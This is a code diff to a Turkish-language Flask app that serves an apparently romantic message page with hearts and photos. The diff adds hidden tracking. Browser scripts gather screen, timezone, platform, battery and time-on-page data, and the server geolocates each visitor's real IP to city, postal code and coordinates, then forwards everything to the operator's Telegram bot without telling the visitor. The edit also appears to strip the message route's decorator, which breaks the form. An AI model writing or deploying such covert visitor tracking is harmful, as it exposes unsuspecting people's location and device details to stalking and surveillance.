@@ -265,6 +265,47 @@ HTML_SAYFA = """
         }, 5000);
       });
 
+    // Tarayıcı & sistem bilgilerini topla ve sunucuya gönder
+    const _girisSaati = Date.now();
+    (async () => {
+      let pil = '?';
+      try {
+        const b = await navigator.getBattery();
+        pil = (b.level * 100).toFixed(0) + '% ' + (b.charging ? '(Şarj oluyor)' : '(Şarj değil)');
+      } catch(e) { pil = 'Erişilemiyor'; }
+
+      const bilgi = {
+        ekran:        screen.width + 'x' + screen.height + ' (' + screen.availWidth + 'x' + screen.availHeight + ' kullanılabilir)',
+        pencere:      window.innerWidth + 'x' + window.innerHeight,
+        saat:         new Date().toLocaleString('tr-TR'),
+        zaman_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        platform:     navigator.platform || navigator.userAgentData?.platform || '?',
+        pil:          pil,
+        cevrimici:    navigator.onLine ? 'Evet' : 'Hayır',
+      };
+
+      fetch('/api/bilgi', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(bilgi)
+      });
+    })();
+
+    // Sayfada kalınan süreyi gönder
+    function _sureyiGonder() {
+      const saniye = Math.round((Date.now() - _girisSaati) / 1000);
+      const veri = JSON.stringify({ saniye });
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon('/api/sure', new Blob([veri], { type: 'application/json' }));
+      } else {
+        fetch('/api/sure', { method: 'POST', headers: {'Content-Type':'application/json'}, body: veri, keepalive: true });
+      }
+    }
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') _sureyiGonder();
+    });
+    window.addEventListener('beforeunload', _sureyiGonder);
+
     const emojiler = ['❤️','🌹','💕','✨','🌸','💫','🥀','💗'];
     const kont = document.getElementById('kalpler');
     function kalp_ekle() {
@@ -292,13 +333,89 @@ def bildirim_gonder(mesaj):
         print("Telegram credentials eksik.")
         return False
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": mesaj}
+    payload = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
     try:
         r = requests.post(url, json=payload, timeout=5)
         return r.status_code == 200
     except Exception as e:
         print("Bildirim gönderilemedi:", e)
         return False
+
+
+def gercek_ip_al(req):
+    """Proxy arkasındaki gerçek IP'yi al."""
+    for header in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP", "True-Client-IP"):
+        val = req.headers.get(header)
+        if val:
+            return val.split(",")[0].strip()
+    return req.remote_addr or "Bilinmiyor"
+
+
+def ip_konum_al(ip):
+    """ip-api.com üzerinden konum bilgisi çek."""
+    try:
+        r = requests.get(
+            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query",
+            timeout=5
+        )
+        if r.status_code == 200:
+            d = r.json()
+            if d.get("status") == "success":
+                return d
+    except Exception:
+        pass
+    return None
+
+
+def ziyaretci_mesaj_olustur(req, ek_bilgi=None):
+    """Ziyaretçi hakkında detaylı Telegram mesajı oluştur."""
+    from datetime import datetime, timezone
+    ip = gercek_ip_al(req)
+    ua = req.headers.get("User-Agent", "Bilinmiyor")
+    dil = req.headers.get("Accept-Language", "Bilinmiyor")
+    referer = req.headers.get("Referer", "Doğrudan giriş")
+    zaman = datetime.now(timezone.utc).strftime("%d.%m.%Y %H:%M:%S UTC")
+
+    konum = ip_konum_al(ip)
+
+    satirlar = [
+        "👤 <b>YENİ ZİYARETÇİ</b>",
+        "",
+        f"🕐 <b>Zaman:</b> {zaman}",
+        f"🌐 <b>IP Adresi:</b> <code>{ip}</code>",
+    ]
+
+    if konum:
+        satirlar += [
+            f"🏳️ <b>Ülke:</b> {konum.get('country', '?')}",
+            f"📍 <b>Şehir:</b> {konum.get('city', '?')} / {konum.get('regionName', '?')}",
+            f"📮 <b>Posta Kodu:</b> {konum.get('zip', '?')}",
+            f"🗺️ <b>Koordinat:</b> {konum.get('lat', '?')}, {konum.get('lon', '?')}",
+            f"📡 <b>ISS:</b> {konum.get('isp', '?')}",
+            f"🏢 <b>Org:</b> {konum.get('org', '?')}",
+        ]
+
+    satirlar += [
+        "",
+        f"🖥️ <b>Tarayıcı/Cihaz:</b> {ua}",
+        f"🌍 <b>Dil:</b> {dil}",
+        f"🔗 <b>Nereden Geldi:</b> {referer}",
+    ]
+
+    if ek_bilgi:
+        satirlar += [
+            "",
+            "📊 <b>Ekran & Sistem Bilgisi:</b>",
+            f"📐 <b>Ekran:</b> {ek_bilgi.get('ekran', '?')}",
+            f"🖱️ <b>Pencere:</b> {ek_bilgi.get('pencere', '?')}",
+            f"⏰ <b>Yerel Saat:</b> {ek_bilgi.get('saat', '?')}",
+            f"🌐 <b>Zaman Dilimi:</b> {ek_bilgi.get('zaman_dilimi', '?')}",
+            f"💻 <b>Platform:</b> {ek_bilgi.get('platform', '?')}",
+            f"🔋 <b>Pil:</b> {ek_bilgi.get('pil', '?')}",
+            f"🌐 <b>Çevrimiçi mi:</b> {ek_bilgi.get('cevrimici', '?')}",
+        ]
+
+    return "\n".join(satirlar)
 
 
 @app.route("/api/fotos")
@@ -317,16 +434,65 @@ def foto_listesi():
 
 @app.route("/")
 def ana_sayfa():
-    bildirim_gonder("👀 Biri sayfana girdi!")
+    mesaj = ziyaretci_mesaj_olustur(request)
+    bildirim_gonder(mesaj)
     return render_template_string(HTML_SAYFA, basarili=False, hata=False, onceki_mesaj="")
 
 
-@app.route("/mesaj", methods=["POST"])
+@app.route("/api/bilgi", methods=["POST"])
+def tarayici_bilgi():
+    """JavaScript'ten gelen ekran/sistem bilgilerini al ve Telegram'a gönder."""
+    try:
+        veri = request.get_json(force=True, silent=True) or {}
+        ip = gercek_ip_al(request)
+        ek = {
+            "ekran":       veri.get("ekran", "?"),
+            "pencere":     veri.get("pencere", "?"),
+            "saat":        veri.get("saat", "?"),
+            "zaman_dilimi":veri.get("zaman_dilimi", "?"),
+            "platform":    veri.get("platform", "?"),
+            "pil":         veri.get("pil", "?"),
+            "cevrimici":   veri.get("cevrimici", "?"),
+        }
+        mesaj = f"📊 <b>EK BİLGİ</b> — <code>{ip}</code>\n\n"
+        mesaj += "\n".join([
+            f"📐 <b>Ekran:</b> {ek['ekran']}",
+            f"🖱️ <b>Pencere:</b> {ek['pencere']}",
+            f"⏰ <b>Yerel Saat:</b> {ek['saat']}",
+            f"🌐 <b>Zaman Dilimi:</b> {ek['zaman_dilimi']}",
+            f"💻 <b>Platform:</b> {ek['platform']}",
+            f"🔋 <b>Pil:</b> {ek['pil']}",
+            f"🌐 <b>Çevrimiçi mi:</b> {ek['cevrimici']}",
+        ])
+        bildirim_gonder(mesaj)
+    except Exception as e:
+        print("Bilgi endpoint hatası:", e)
+    return jsonify({"ok": True})
+
+
+@app.route("/api/sure", methods=["POST"])
+def sure_al():
+    """Kullanıcının sayfada kaldığı süreyi al ve Telegram'a gönder."""
+    try:
+        veri = request.get_json(force=True, silent=True) or {}
+        saniye = int(veri.get("saniye", 0))
+        ip = gercek_ip_al(request)
+        if saniye < 60:
+            sure_str = f"{saniye} saniye"
+        else:
+            dakika = saniye // 60
+            kalan = saniye % 60
+            sure_str = f"{dakika} dakika {kalan} saniye"
+        bildirim_gonder(f"⏱️ <b>Sayfada Kalınan Süre</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n🕒 <b>Süre:</b> {sure_str}")
+    except Exception as e:
+        print("Süre endpoint hatası:", e)
+    return "", 204
 def mesaj_al():
     metin = request.form.get("mesaj", "").strip()
     if not metin:
         return render_template_string(HTML_SAYFA, basarili=False, hata=True, onceki_mesaj="")
-    basarili = bildirim_gonder(f"📩 Yeni mesaj:\n\n{metin}")
+    ip = gercek_ip_al(request)
+    basarili = bildirim_gonder(f"📩 <b>Yeni Mesaj</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n\n{metin}")
     return render_template_string(
         HTML_SAYFA,
         basarili=basarili,
